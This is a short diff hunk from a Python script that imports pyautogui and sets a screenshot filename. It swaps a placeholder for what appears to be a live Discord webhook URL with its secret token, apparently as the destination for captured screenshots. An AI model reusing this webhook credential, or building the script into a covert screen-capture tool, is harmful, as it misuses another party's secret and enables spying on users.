@@ -3,7 +3,7 @@ import pyautogui
 import time
 
 # Your Discord Webhook URL
-WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"
 
 # Screenshot filename
 screenshot_filename = "screenshot.png"
